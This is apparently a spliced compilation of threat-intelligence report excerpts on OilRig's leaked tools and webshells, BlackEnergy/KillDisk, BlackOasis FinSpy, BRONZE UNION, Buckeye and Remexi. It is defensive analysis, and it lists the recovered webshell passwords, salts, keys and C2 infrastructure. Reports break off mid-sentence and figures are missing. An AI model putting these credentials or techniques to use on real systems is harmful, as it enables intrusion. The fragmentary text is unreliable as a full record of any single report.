September 2018 The data dump included the following three requisite components of the Glimpse tool seen in Table 2, as well as a Read me.txt file that explains how to set up and use Glimpse Component Description   Agent Powershell scripts meant to run on compromised systems The three components of the Glimpse tool Glimpse is a PowerShell script that contains the comment version 2.2, which suggests the OilRig group considers this a specific version of the tool and that it likely has included prior versions The Glimpse panel, versioned \u201cv1.0.5\u201d is the tool that the actor uses to organize the various agents installed on compromised systems The panel allows the actors to issue commands in addition to uploading files to and downloading files from the compromised endpoints According to the compilation time, the developer of the Glimpse panel created this tool on September 1, 2018 Figure 3 shows the main Glimpse panel with three different agents listed in a test environment Figure 3 Figure 4 Figure 5 shows the result viewer window showing the results of the issued command Figure 5 The Result Viewer showing the results of an issued command  The server portion of Glimpse works in unison with the panel by acting as a DNS server, which is written in JavaScript and runs in the Node.js runtime The server has a filename of srvr.js, which according to the Read me.txt file is meant to be run using forever start srvr.js in Node.js Figure 6 The Glimpse server issuing a command to an agent and receiving the results of the command Poison Frog The second backdoor included in the data dump is named Poison Frog The dataset includes both the agent that the actor would install on targeted systems and the server that would allow the actor to interact with compromised systems The Poison Frog tool appears to be a variant of BONDUPDATER used in targeted attacks in the Middle East, as reported by FireEye in December 2017 Table 3 shows the files associated with the agent included in the data dump, of which the dUpdater.ps1 portion of Poison Frog appears to be the initial variant of BONDUPDATER that uses DNS tunneling for its C2 channel as discussed in our recent blog discussing OilRig\u2019s DNS tunneling protocols Interestingly, both of these Poison Frog agent scripts were configured to use the domain myleftheart[.]com as its C2 server though we have not seen this domain in any attacks, and we were unable to associate it with any known OilRig infrastructure Files associated with the Poison Frog agent provided in the leak Like the Glimpse C2 server, the Poison Frog server was written in JavaScript and will run in Node.js The headers included in this batch script looked very familiar, as we had seen a very similar batch script provided via the HTTP C2 channel for the Helminth backdoor delivered by a Clayslide delivery document as we reported in October 2016 (SHA256: 903b6d948c16dc92b69fe1de76cf64ab8377893770bf47c29bf91f3fd987f996) Figure 7 The three webshells included in the dump had names HyperShell, HighShell, and Minion, but it appears that Minion is likely a variant of HighShell based on code, filename, and functionality overlaps In addition to the actual webshells in use by OilRig, the data dump includes lists of existing deployments of webshells hosted on compromised websites Over 100 links to webshells are listed, spanning across 87 organizations in 26 countries across four continents as seen in Figure 8 Figure 8 Geographic location of webshells of impacted organizations Hypershell The HyperShell webshell included in the data dump (SHA256: e483eee77fcc5ef11d5bf33a4179312753b62ec9a247dd14528cc797e7632d99) is an example of the 3DES variant of the TwoFace loader that we called TwoFace++ in as we reported in July 2017 The initial TwoFace loader samples decrypted an embedded webshell using an actor provided key, which was modified by using simple arithmetic operators (\u201c+\u201d or \u201c-\u201d specifically) and a salt string embedded within the loader webshell, whose result decrypts an embedded payload using simple arithmetic operators (again, \u201c+\u201d or \u201c-\u201d specifically) Unlike the initial TwoFace loader, the TwoFace++ loader used the 3DES cipher and a SHA256 hash of a string provided by the actor and used as a key, so we were unable to extract the embedded webshells as we were unable to determine the actor provided key However, the HyperShell sample in this dump provided the necessary information to determine the actor-provided key needed to decrypt its embedded webshell Like many initial TwoFace loader samples, the HyperShell sample includes a string within the HTML tags <pre> and </pre> that is displayed in the browser if a password is not supplied and/or the TwoFace++ loader is unable to extract the embedded payload webshell The pre tags within the HyperShell sample are: <pre><%= Server.HtmlEncode(\u201cNxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a\u201d) %></pre> Figure 9 shows HyperShell displaying the content within the \u201cpre\u201d tags within the browser Figure 9 HyperShell displaying the password within <pre> tags We determined the string in the pre tags is the actor provided password, which the webshell uses as a key to decrypt the embedded payload The actor provided password of NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a has the hardcoded salt string aqB2nU65TgFoEfdVqiAddBQLInc9 appended to it The resulting string of NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7aaqB2nU65TgFoEfdVqiAddBQLInc9 has a SHA1 hash of 9d3ff106fbc3508b8453c7d6f285543d0b9c2721, which is base64 encoded to nT/xBvvDUIuEU8fW8oVUPQucJyE= The hardcoded base64 encoded password within the sample is nT/xBvvDUIuEU8fW8oVUPQucJyE=, which confirms that the string provided in the pre tags is the password Once authenticated, the TwoFace++ loader uses the password to decrypt the embedded webshell To use the password as a key for 3DES, TwoFace++ will generate the SHA256 password of the NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a string that results in a hash of 11f66b55f3d24303621e5ef9565b02a576cc58bc5f8789cae96c3d400064b90e The key EfZrVfPSQwNiHl75VlsCpXbM is used as the key for 3DES, which results in a webshell (SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619) that matches the TwoFace payload webshell we published in our original blog This resulting webshell also appears to be a variant of HighShell, specifically version v5.0 We compared the v5.0 version of HighShell to the TwoFace payload (SHA256: 54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f), as they are visually extremely similar Figure 10 shows the two webshells sharing the same user interface, with two notable exceptions in the HighShell webshell, specifically a version number \u201cv5.0\u201d and three little boxes at the bottom left used to display error messages and the results of commands Figure 10 Animation showing the differences between the HighShell v5.0 and TwoFace payload To supplement the visual similarities, we performed an analysis of the code of the two webshells to identify overlaps The two webshells share a significant amount of code with a majority of the differences being slightly different variable and function names The most notable difference is that the HighShell v5.0 webshell includes a salt value it applies to the actor provided password that it uses for authentication Figure 11 shows the code comparison between the TwoFace payload on the left (SHA256: 54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f) and HighShell v5.0 on the right (SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619) Figure 11 Comparison between HighShell v5.0 and TwoFace payload The code comparison in Figure 11 also highlights how much code is shared between the two samples We believe the TwoFace payload is a predecessor to the HighShell v5.0 webshell, the latter of which was created during the ongoing development efforts carried out by OilRig throughout their operations HighShell The data dump also included a webshell named HighShell, which we discovered was dropped by HyperShell as discussed in the previous section The dump included many different HighShell samples, of which we have identified at least three different versions, seen in Table 4 The increasing version numbers suggest that OilRig continually developed HighShell to be used in their operations SHA256 Filename Version   fe9cdef3c88f83b74512ec6400b7231d7295bda78079b116627c4bc9b7a373e0 error4.aspx v5.0   22c4023c8daa57434ef79b838e601d9d72833fec363340536396fe7d08ee2017 HighShell.aspx v7.1   691801e3583991a92a2ad7dfa8a85396a97acdf8a0054f3edffd94fc1ad58948 HighShellLocal.aspx 8.6.2    Table 4 Three HighShell webshells within data leak that specified their version The version numbers themselves do not appear to be consistently updated, however For instance, the HighShell webshell (SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619) extracted from HyperShell in the prior section showed a version number of \u201cv5.0\u201d, which is obviously different than the \u201cv5.0\u201d HighShell with a filename of error4.aspx seen in Figure 12 Figure 12 HighShell v5.0 with a new color scheme and explorer tab Figure 12 shows a second HighShell v5.0 sample with a different color scheme used for its user interface; however, a majority of the functionality is the same as the other v5.0 sample extracted from HyperShell One interesting addition to this variant of HighShell v5.0 is the introduction of a tabular interface that includes a main tab and an explorer tab The main tab contains the same functionality as the TwoFace payload and the other v5.0 HighShell sample The explorer tab, as seen in Figure 13 allows the actors to navigate the compromised server\u2019s file system Figure 13 Figure 14 shows HighShell v7.1 and its multiple tabs Figure 14 HighShell v7.1 spreads out the webshell by using separate tabs for the various functionality The data dump also included an archive named ShellLocal-v8.8.5.rar that contains another HighShell variant The archive name would suggest the HighShell variant was version v8.8.5, but the user interface suggested it was version 8.6.2, as seen in Figure 15 This variant of HighShell shares code from its predecessors, but it appears that OilRig re-architected this webshell to include a front end user interface that interacts with a back end script via AJAX web requests In addition to the change in architecture, this version of HighShell has an enhanced interface as well Figure 15 HighShell v8.6.2 with updated interface The 8.6.2 version of HighShell shares significant functionality with its predecessors, but also contains several new and interesting functionalities as well The interesting features of this version of HighShell includes several executable modules, a network downloader functionality, and a spy check feature Modules HighShell 8.6.2 includes the ability to use several modules included with the webshell The modules are PE executables that come prepackaged with the webshell that further extend its capabilities Table 5 shows the modules provided with this variant of HighShell The webshell will use the 7za module to archive files from the Explorer tab, while the nbtscan module allows the webshell to scan the network for systems to build an IP list of system it can interact with We were unable to determine how the webshell would use the remote execute module, as the webshell does not actually seem to use it Modules included with HighShell v8.6.2 Spy Check The Spy Check functionality appears at the top right corner of the webshell as a box with a countdown timer The timer starts at 300 and decrements every second, suggesting that the webshell executes the Spy Check functionality every five minutes The Spy Check functionality is rather interesting, as we do not know its exact purpose other than either displaying a red box with a spy icon or a green box with a heart icon We believe this functionality was meant to notify the actor in the event that they were using an altered HighShell front end webshell, possibly to avoid using the webshell if it had been detected and modified by a third-party We are speculating this is the intended function because the Spy Check function begins by reading the .aspx file of the HighShell front end (HighShellLocal.aspx in this case) The Spy Check then generates the SHA256 hash of the HighShell front end and compares it with a hardcoded SHA256 of f35e566e28be5b3257670be6e125eb90814b9cb27df997090cea0b7a22fbd75c to determine if the webshell had been modified If the hashes do not match, the webshell will display a red box with spy icon, as seen in Figure 15, or a green box with a heart icon if it matches All known samples display the red box with a spy icon, suggesting that the developer of HighShell did not update this functionality during development efforts or that the samples have been modified in some way To use this functionality, the actor must provide information within the \u201cTarget Computer\u201d portion of the webshell, specifically a network administrator username and password, as well as a list of IP addresses of remote systems added in the \u201cSelect Computer\u201d drop down Before performing the network download, the webshell checks the storage volume on the server that the webshell is running on to determine if it has more than 30 GB of free space If the server has less than 30 GB of free space the webshell will not perform the activity, which indicates that the developer of the webshell expects a high volume of data downloaded from the victim network Minion Minion appears to be another webshell related to HighShell, as it contains similar functionality and significant code overlap Based on the login functionality within Minion, we believe the same entities were involved in the development of Minion and HyperShell To use Minion, the actor must provide the username of admin and a password to authenticate before using the webshell To authenticate, the password has the string O%tG7Hz57kvWk35$D*)s$1l$pUpLnBw)apHR!xYZWZu7X#^w7$mCArmQMAa&sRBG appended to it as a salt value The webshell generates the SHA256 hash of the resulting string and base64 encodes it to compare with the hardcoded string of m6m8CCWa/u820mie8bX3HKIx1+WQkB+lbmniyXWKB+8= The password and salt string must result in a SHA256 hash of 9ba9bc08259afeef36d2689ef1b5f71ca231d7e590901fa56e69e2c9758a07ef to properly authenticate This is the exact same process used to authenticate/decrypt within HyperShell Much like HighShell version 8.6.2, Minion includes modules to extend the webshell\u2019s functionality Table 6 shows the modules included with Minion, three of which are the same exact files as seen in the HighShell and Minion including Hobocopy and a port scanning, screenshot tool called Tardigrade Can perform port scanning, screenshots and connect to remote systems with \u201cnet use\u201d Table 6 Modules included with the Minion webshell DNS Hijacking Script In November 2018, Cisco Talos published research on an attack campaign named DNSpionage It involved attacks using malware to compromise individual endpoints, but most interestingly described an effort to specifically hijack DNS entries of government organizations to redirect visitors to likely malicious, adversary operated systems Both FireEye and Crowdstrike followed up with their own assessments for the DNS hijacking efforts, and described operations extending back to January 2017 No attribution to any known adversary groups was provided, other than that the target radius was primarily in the Middle East and the adversary was also likely operating out of that region In this data dump, a tool called webmask is included which appears to be a series of scripts specifically meant to perform DNS hijacking An informational document is included titled guide.txt, as seen in Figure 16 that provides instructions to the operator on how to execute the DNS hijacking attack using the provided tools Figure 16 Analysis of this IP provides several interesting data points, including possible relationships to previously observed OilRig infrastructure Examining the hosting provider shows that the IP is associated with an Iranian hosting provider called NovinVPS In fact, examining the Class C IP block of 185.162.235[.]0/24 shows at least two other IPs we have previously identified as in use by the OilRig group for C2 servers 185.162.235[.]29 and 185.162.235[.]121 and their associated domains, office365-management[.]com and msoffice-cdn[.]com respectively Office365-management[.]com was first identified in October 2017 as a C2 servers for OilRig operations delivering the ISMInjector backdoor Later in February 2018 we were able to link the entire grouping of infrastructure to another campaign delivering the OopsIE backdoor via the reuse of WHOIS registrant artifacts, shared SSL certificates, and a shared Class C IP block Figure 17 shows the relationship between the files related to DNS hijacking and known infrastructure associated with OilRig Figure 17 Relationship between DNS Hijacking files and OilRig infrastructure Although we are unable to say with certainty that the DNSpionage operations were absolutely executed by the OilRig group, it is possible based on the provided data that there may be some level of relationship between them The screenshot in Figure 18 appears to be a C2 panel for an unknown backdoor The only name provided is Scarecrow, which is not a name we have previously observed or associated with OilRig The server is hosted on 142.234.157[.]21 which appears to be hosted by LeaseWeb If we are to assume the filename is consistent with a real time snapshot of the server panel, it would indicate that multiple systems were actively compromised as of March 29, 2019 Figure 18 Screenshot provided in leak showing Scarecrow panel Figure 19 shows an administrative panel to an Iranian based virtual hosting provider called Berbid Server No other infrastructure details are displayed Figure 19 One of these virtual servers was hosted at an IP address of 193.111.152[.]13 and had been up for 194 days (in the red box in Figure 20) at the time this control panel was apparently accessed Figure 20 This suggests that the server displayed in the VPS control panel may have indeed been in use by the OilRig threat actors at the time of attack In addition, two of the other IPs listed in this panel, 185.161.209[.]57 and 185.161.210[.]25 are in the same 185.161.208[.]0/22 range as an IP associated with the DNSpionage campaign, 185.161.211[.]72 This is a tenuous relationship at best and does not indicate that the OilRig group is the one executing the DNSpionage campaign, but with the combination of the use of DeltaHost and IPs belonging to a fairly small range, there may be reason to believe that these are related to some extent Figure 21 is a screenshot of a C2 server panel for Glimpse, which we track using the name BONDUPDATER If we again assume the accuracy of the time indicated in the filename, this would indicate that no compromised system had checked in since as far out as 71 days Figure 21 Screenshot in leak of RDP session with a server running the Glimpse C2  Conclusion This data dump has provided a rare and unusual perspective into the behind-the-scenes activity in an adversary\u2019s operations It is important to understand that although we are able to validate the backdoors and webshells provided in the dataset as consistent with previously researched OilRig toolsets, in general we are unable to validate the origins of the entirety of the dataset and cannot confirm nor deny that the data has not been manipulated in some manner It is certainly possible that the data dump did indeed originate from a whistleblower, but it is just as likely that a third party was able to extract this data Looking at the data dump as a whole though, the targeting and TTPs are consistent with behaviors we have generally associated with OilRig in the past Assuming the data in the dump is accurate, it also shows the global reach of the OilRig threat group, which generally is assumed to operate primarily in the Middle East The disparity in regions and industries for organizations potentially affected or compromised by OilRig is an excellent example of why organizations regardless of region or industry should always maintain situational awareness of adversaries, their activities, and be prepared to defend against any attack Indicators of Compromise Domains  Myleftheart[.]com

electric power industry The cybercriminal group behind BlackEnergy, the malware family that has been around since 2007 and has made a comeback in 2014 (see our previous blog posts on Back in BlackEnergy *: 2014 Targeted Attacks in Ukraine and Poland and BlackEnergy PowerPoint Campaigns, as well as our Virus Bulletin talk on the subject), was also active in the year 2015 ESET has recently discovered that the BlackEnergy trojan was recently used as a backdoor to deliver a destructive KillDisk component in attacks against Ukrainian news media companies and against the electrical power industry In this blog, we provide details on the BlackEnergy samples ESET has detected in 2015, as well as the KillDisk components used in the attacks Furthermore, we examine a previously unknown SSH backdoor that was also used as another channel of accessing the infected systems, in addition to BlackEnergy We continue to monitor the BlackEnergy malware operations for future developments For any inquiries or to make sample submissions related to the subject, contact us at: threatintel@eset.com Once activated, variants of BlackEnergy Lite allow a malware operator to check specific criteria in order to assess whether the infected computer truly belongs to the intended target If that is the case, the dropper of a regular BlackEnergy variant is pushed to the system The exact mechanism of infection by BlackEnergy is described in our Virus Bulletin presentation and this whitepaper by F-Secure The BlackEnergy malware stores XML configuration data embedded in the binary of DLL payload Figure 1 \u2013 The BlackEnergy configuration example used in 2015 Apart from a list of C&C servers, the BlackEnergy config contains a value called build_id This value is a unique text string used to identify individual infections or infection attempts by the BlackEnergy malware operators The combinations of letters and numbers used can sometimes reveal information about the campaign and targets

\u201cKiev\u201d In 2014 some variants of the BlackEnergy trojan contained a plugin designed for the destruction of the infected system, named dstr In 2015 the BlackEnergy group started to use a new destructive BlackEnergy component detected by ESET products as Win32/KillDisk.NBB, Win32/KillDisk.NBC and Win32/KillDisk.NBD trojan variants The main purpose of this component is to do damage to data stored on the computer: it overwrites documents with random data and makes the OS unbootable The first known case where the KillDisk component of BlackEnergy was used was documented by CERT-UA in November 2015 In that instance, a number of news media companies were attacked at the time of the 2015 Ukrainian local elections The report claims that a large number of video materials and various documents were destroyed as a result of the attack It has a long list of file extensions that it tries to overwrite and delete The complete list contains more than 4000 file extensions Figure 2 \u2013 A partial list of file extensions targeted for destruction by KillDisk.NBB The KillDisk component used in attacks against energy companies in Ukraine was slightly different Our analysis of the samples shows that the main changes made in the newest version are:  Now it accepts a command line argument, to set a specific time delay when the destructive payload should activate It is less focused on deleting documents Only 35 file extensions are targeted The second process name may belong to software called ASEM Ubiquity, a software platform that is often used in Industrial control systems (ICS), or to ELTIMA Serial to Ethernet Connector In case the process is found, the malware does not just terminate it, but also overwrites the executable file with random data In addition to the malware families already mentioned, we have discovered an interesting sample used by the BlackEnergy group However, for some reason this was not enough for them After detailed analysis we discovered that the

intelreports@kaspersky.com Introduction Kaspersky Lab has always worked closely with vendors to protect users As soon as we find new vulnerabilities we immediately inform the vendor in a responsible manner and provide all the details required for a fix The exploit was delivered through a Microsoft Office document and the final payload was the latest version of FinSpy malware We have reported the bug to Adobe who assigned it CVE-2017-11292 and released a patch earlier today: So far only one attack has been observed in our customer base, leading us to believe the number of attacks are minimal and highly targeted Analysis of the payload allowed us to confidently link this attack to an actor we track as \u201cBlackOasis\u201d BlackOasis Background We first became aware of BlackOasis\u2019 activities in May 2016, while investigating another Adobe Flash zero day On May 10, 2016, Adobe warned of a vulnerability (CVE-2016-4117) affecting Flash Player 21.0.0.226 and earlier versions for Windows, Macintosh, Linux, and Chrome OS The vulnerability was actively being exploited in the wild Kaspersky Lab was able to identify a sample exploiting this vulnerability that was uploaded to a multi scanner system on May 8, 2016 Although the exact payload of the attack was no longer in the C&C, the same server was hosting multiple FinSpy installation packages Since the discovery of BlackOasis\u2019 exploitation network, we\u2019ve been tracking this threat actor with the purpose of better understanding their operations and targeting and have seen a couple dozen new attacks Part of injected code in winlogon process The payload calls out to three C2 servers for further control and exfiltration of data We have observed two of them used in the past with other FinSpy payloads Most recently one of these C2 servers was used together with CVE-2017-8759 in the attacks reported by FireEye in September 2017 These IPs and other previous samples tie closely to the BlackOasis APT cluster of FinSpy activity Targeting and Victims BlackOasis\u2019 interests span a wide gamut of figures involved in Middle Eastern politics and verticals disproportionately relevant to the region This includes prominent figures in the United Nations, opposition bloggers and activists, and regional news correspondents During 2016, we observed a heavy interest in Angola, exemplified by lure documents indicating targets with suspected ties to oil, money laundering, and other illicit activities There is also an interest in international activists and think tanks Victims of BlackOasis have been observed in the following countries: Russia, Iraq, Afghanistan, Nigeria, Libya, Jordan, Tunisia, Saudi Arabia, Iran, Netherlands, Bahrain, United Kingdom and Angola Conclusions We estimate that the attack on HackingTeam in mid-2015 left a gap on the market for surveillance tools, which is now being filled by other companies One of these is Gamma International with their FinFisher suite of tools Although Gamma International itself was hacked by Phineas Fisher in 2014, the breach was not as serious as it was in the case of HackingTeam Additionally, Gamma had two years to recover from the attack and pick up the pace We believe the number of attacks relying on FinFisher software, supported by zero day exploits such as the ones described here will continue to grow Additionally, this may break any other necessary resources that rely on Flash and of course, it will not protect against exploits for other third party software Contact: intelreports@kaspersky.com Acknowledgements We would

Disclosures", "Retrieved May 07, 2019", "Article Content Summary In 2015, the SecureWorks\u00ae Counter Threat Unit\u2122 (CTU) research team documented the BRONZE UNION threat group (formerly labeled TG-3390), which CTU\u2122 analysis suggests is based in the People's Republic of China (PRC) Since that analysis, CTU researchers have observed multiple BRONZE UNION threat campaigns that illustrate the evolution of the group's methods and espionage objectives Despite multiple public disclosures of their activities, BRONZE UNION remains an active and formidable threat as of this publication CTU researchers divided the threat intelligence about this group into two sections: strategic and tactical Executives can use the strategic assessment of the ongoing threat to determine how to reduce risk to their organization's mission and critical assets Computer network defenders can use the tactical information gathered from incident response investigations and research to reduce the time and effort associated with responding to the threat group's activities Key points  CTU researchers assess it is highly likely that the BRONZE UNION threat group gathers defense, security, and political intelligence from organizations around the world CTU researchers have observed it targeting organizations in the aerospace, government, defense, technology, energy, and manufacturing verticals CTU researchers assess it is likely that the group is located in the People's Republic of China BRONZE UNION has historically used strategic web compromises (SWCs) in its campaigns, CTU researchers have also observed it exploiting vulnerable Internet-facing services to gain access to targeted networks After accessing a network, the threat actors leverage a range of proprietary, publicly available, and native tools to search for and acquire desirable data Strategic threat intelligence Analysis of a threat group's targeting, origin, and competencies can determine which organizations could be at risk This information can help organizations make strategic defensive decisions regarding this threat Intent Based on BRONZE UNION's targeting activity, CTU researchers assess it is highly likely that the group focuses on political and defense organization networks In 2016, the threat actors conducted a strategic web compromise (SWC) on the website of an international industry organization that affected aerospace, academic, media, technology, government, and utilities organizations around the world During a discrete period of activity, this SWC was used to specifically target Turkish government, banking, and academic networks These focused attacks suggest a concerted effort to compromise strategically significant networks in Turkey, possibly due to Turkey's political, economic, and military relationships in Europe and the Middle East In addition, BRONZE UNION activity on multiple U.S.-based defense manufacturer networks included the threat actors seeking information associated with aerospace technologies, combat processes, and naval defense systems Third-party analysis suggests that systemic issues in the PRC\u2019s defense technology industries could influence demand for this type of information because this type of data could potentially address innovation and supply deficits which exist within this industry sector in the PRC Attribution In 2015, CTU researchers assessed that BRONZE UNION likely originates in the PRC based on factors such as targeting, operating hours, and tool selection Observed activity since 2015 reinforces that association; for example:  continued focus on information that would be of interest to individuals or groups living in a country that has a significant manufacturing base and a strategic interest in U.S military capabilities use of web shells that have historically been leveraged by threat groups believed to be operating in the PRC connections between a subset of the group's operational infrastructure and PRC-based Internet service companies   Capability BRONZE UNION has consistently demonstrated the capability to conduct successful large-scale intrusions against high-profile networks and systems CTU researchers identified evidence of the group exploiting vulnerabilities in Internet-facing service desk software to gain an initial foothold on desirable networks, while concurrently compromising systems of interest via SWCs During the observed intrusions, the group rapidly collected account credentials, escalated privileges, and deployed multiple web shells presumably to extend its access across the compromised network BRONZE UNION is disciplined and takes proactive steps to avoid detection The group also manipulated native Windows features on compromised systems to access additional legitimate functionality These behaviors indicate that the threat actors quickly gain a detailed understanding of the environments they compromise and use this understanding to conceal their activity from network defenders Although CTU researchers have observed BRONZE UNION modifying its tools, likely in response to public reporting on its activities, there is no evidence that the group's capabilities have changed substantially or that its operations have been deterred Tactical threat intelligence Investigating BRONZE UNION activity and evicting the threat actors from compromised networks have given CTU researchers unique insight into the group's tools and tactics Captured credentials are DES-encrypted using the password \u201c12345678\u201d (see Figure 1), and are written to a text file (log.txt) in the system's root directory Figure 1 Configuration file from OwaAuth.dll Rcmd \u2014 This lateral movement tool facilitates the execution of commands on systems across the target environment Wrapikatz \u2014 This tool wraps Mimikatz code in a custom loader to evade antivirus detection, and changes the command-line usage to evade process-telemetry detection and make the tool easier to use This tool is not exclusive to BRONZE UNION CTU researchers have observed various threat groups leveraging Wrapikatz binaries with different usage options Netview \u2014 This publicly available host-enumeration tool presents details about IP addresses, network shares, remote sessions, and logged-on users Kekeo \u2014 This publicly available toolset manipulates the Kerberos authentication protocol Tactics, techniques, and procedures Observations of BRONZE UNION activity during several network compromises gave CTU researchers insight into the tactics the group employs Access vectors and command and control CTU researchers observed BRONZE UNION delivering malware to systems via SWCs and scan-and-exploit techniques The threat actors appear to be able to create and leverage multiple SWCs in parallel They have also demonstrated the ability to create SWCs and malware-staging sites by leveraging websites linked to networks previously compromised by the group Apparent overlap between existing compromises and new campaigns suggests that the group considers leveraging existing network compromises when planning infrastructure requirements Figure 2 shows a BRONZE UNION infection chain leveraging an SWC Figure 2 Likely BRONZE UNION infection chain observed in 2016 These events strongly suggest that the threat actors leveraged the web application as part of the initial compromise vector The threat actors also integrate infrastructure they likely previously compromised for espionage purposes For example, CTU researchers identified the group using IP addresses owned by several, presumably compromised, research organizations to interact with web shells in other target environments In a separate incident, CTU researchers identified a file named s.txt, which is consistent with the output of the Netview host-enumeration tool Knowledge of the compromised environment allows the threat actors to move laterally between systems CTU researchers identified ten compromised hosts in one environment that contained artifacts associated with the Rcmd lateral-movement tool Use of the tool leaves a small helper script (read.vbs) on the target system Defensive evasion CTU researchers observed BRONZE UNION actors reconfiguring legitimate Windows features to establish PowerShell remoting and WinRM (see Figure 3) These remote management technologies allow a full range of configuration, data transfer, and remote execution capabilities over HTTP/HTTPS channels Enabling these features gives the threat actor a remote control channel to persistently access the victim's environment without using malicious software that could be detected Figure 3 PowerShell commands The DLL acts as a stub loader, which loads and executes shell code BRONZE UNION previously used this technique to enable execution of PlugX and HttpBrowser tools in a way that is challenging for network defenders to detect Figure 4 (Source: SecureWorks) Credential access BRONZE UNION uses various tools for credential theft Figure 5 shows the commands used to perform these activities on a RAR archive renamed with a *.jpg extension Figure 5 BRONZE UNION commands The threat actor also attempted to use OWA account credentials likely acquired during an earlier phase of the intrusion BRONZE UNION appeared to leverage other compromised infrastructure, presumably to make reentry attempts seem legitimate This attempt illustrates the importance of thorough planning when conducting an eviction and the need for continuous vigilance for evidence of reentry Conclusion As of this publication, BRONZE UNION remains a formidable threat group that targets intellectual property and executes its operations at a swift pace Its activities indicate a preference for leveraging SWCs and scan-and-exploit techniques to compromise target systems To mitigate these threats, CTU researchers recommend that clients conduct regular internal vulnerability scanning, patching, and upgrading of priority systems, particularly Internet-facing systems and users' devices Early detection and response can minimize exposure and damage Threat indicators The threat indicators in Table 1 are

"Article Content Buckeye (also known as APT3, Gothic Panda, UPS Team, and TG-0110) is a cyberespionage group that is believed to have been operating for well over half a decade Traditionally, the group attacked organizations in the US as well as other targets However, Buckeye\u2019s focus appears to have changed as of June 2015, when the group began compromising political entities in Hong Kong Since March 2016, the group has appeared to mostly focus on organizations in Hong Kong, sending malicious emails to targets as recently as August 4, and attempting to spread within compromised networks in order to steal information Using the combined threat intelligence of Symantec and Blue Coat Systems, we have built a clear and concise picture of how Buckeye has evolved its tactics in recent years This has allowed us to further enhance our protection capabilities against the group\u2019s campaigns Background Symantec has observed Buckeye activity dating back to 2009, involving attacks on various organizations in several regions Buckeye used a remote access Trojan (Backdoor.Pirpi) in attacks against a US organization\u2019s network in 2009 The group delivered Backdoor.Pirpi through malicious attachments or links in convincing spear-phishing emails Symantec has identified additional tools used by the group, which will be discussed later Although other zero-day attacks have been reported, they have not been confirmed by Symantec Shifting focus of attacks More recently, Symantec telemetry has revealed Backdoor.Pirpi connections from compromised computers based in Hong Kong dating back to August 2015 The infections significantly increased in number towards the end of March 2016 and the beginning of April 2016 Additional investigations discovered related malware samples and determined that targeted organizations were political entities in Hong Kong Who\u2019s being targeted? From 2015 to date, Symantec identified approximately 82 organizations in various regions that had Buckeye tools present on their network However, this is not an accurate picture of the targets of interest to Buckeye The group casts a wide net while trawling for targets but only remains active on the networks of organizations it is interested in After these filters were applied to our data, we found a total of 17 organizations, located in Hong Kong (13), the US (3), and the UK (1) Figure 1 Buckeye victims of interest by region (2015 to date) It should be noted that this data goes back to 2015 and that the proportion of targets in Hong Kong from March 2016 would be considerably higher Up to mid-2015, Buckeye\u2019s traditional targets were varying categories of US organizations, which match the types of victims seen in the UK Buckeye interests changed substantially around June 2015 when the group began infecting organizations in Hong Kong Infections in the UK and US ceased shortly after this time Figure 2 Many of the hacking tools are open source applications that have been patched or modified in some manner by Buckeye in an attempt to evade detection Buckeye uses Backdoor.Pirpi, a remote access Trojan capable of reading, writing, and executing files and programs Usage is: %s shareIp domain\u00a0[USER INFORMATION|[USER NAME AND PASSWORD]] [/run:[COMMAND]] The commands to be passed consist of upload, download, Service (create, delete, start, stop), delete, rename, and AT PwDumpVariant: This tool imports lsremora.dll (often downloaded by the attacker as part of the toolset) and uses the GetHash export of this DLL Lazagne: A compiled Python tool that extracts passwords from various locally installed application classes, such as web browsers The full list is: chats, svn, wifi, mails, windows, database, sysadmin, and browsers Buckeye seems to target file and print servers, which makes it likely the group is looking to steal documents This, coupled with the group\u2019s use of zero-day exploits in the past, customized tools, and the types of organizations being targeted would suggest that Buckeye is a state-sponsored cyberespionage group Protection

Iran-based foreign diplomatic entities", "Retrieved May 07, 2019", "Article Content Executive Summary Throughout the autumn of 2018 we analyzed a long-standing (and still active at that time) cyber-espionage campaign that was primarily targeting foreign diplomatic entities based in Iran The attackers were using an improved version of Remexi in what the victimology suggests might be a domestic cyber-espionage operation This malware has previously been associated with an APT actor that Symantec calls Chafer The attackers rely heavily on Microsoft technologies on both the client and server sides: the Trojan uses standard Windows utilities like Microsoft Background Intelligent Transfer Service (BITS) bitsadmin.exe to receive commands and exfiltrate data Remexi developers use the C programming language and GCC compiler on Windows in the MinGW environment They most likely used the Qt Creator IDE in a Windows environment XOR and RC4 encryption is used with quite long unique keys for different samples Among all these random keys once the word \u201csalamati\u201d was also used, which means \u201chealth\u201d in Farsi Kaspersky Lab products detect the malware described in this report as Trojan.Win32.Remexi and Trojan.Win32.Agent This blogpost is based in our original report shared with our APT Intelligence Reporting customers last November 2018 For more information please contact: intelreports@kaspersky.com Technical analysis The main tool used in this campaign is an updated version of the Remexi malware, publicly reported by Symantec back in 2015 The newest module\u2019s compilation timestamp is March 2018 The developers used GCC compiler on Windows in the MinGW environment Inside the binaries the compiler left references to the names of the C source file modules used: \u201coperation_reg.c\u201d, \u201cthread_command.c\u201d and \u201cthread_upload.c\u201d Like mentioned in modules file names the malware consists of several working threads dedicated to different tasks, including C2 command parsing and data exfiltration Proliferation  So far, our telemetry hasn\u2019t provided any concrete evidence that shows us how the Remexi malware spread However, we think it\u2019s worth mentioning that for one victim we found a correlation between the execution of Remexi\u00b4s main module and the execution of an AutoIt script compiled as PE, which we believe may have dropped the malware This dropper used an FTP with hardcoded credentials to receive its payload FTP server was not accessible any more at the time of our analysis The Remexi developers seem to rely on legitimate Microsoft utilities, which we enumerate in the table below Utility Usage   extract.exe Deploys modules from the .cab file into the working Event Cache directory   bitsadmin.exe Fetches files from the C2 server to parse and execute commands Mechanisms vary for different OS versions In the case of old Windows versions like XP, main module events.exe runs an edited XPTask.vbs Microsoft sample script to create a weekly scheduled task for itself All such indicators of comprometation are mentioned in correspondent appendix below Commands  All the commands received from the C2 are first saved to an auxiliary file and then stored encrypted in the system registry The standalone thread will decrypt and execute them RC4 file encryption relies on the Windows 32 CryptoAPI, using the provided 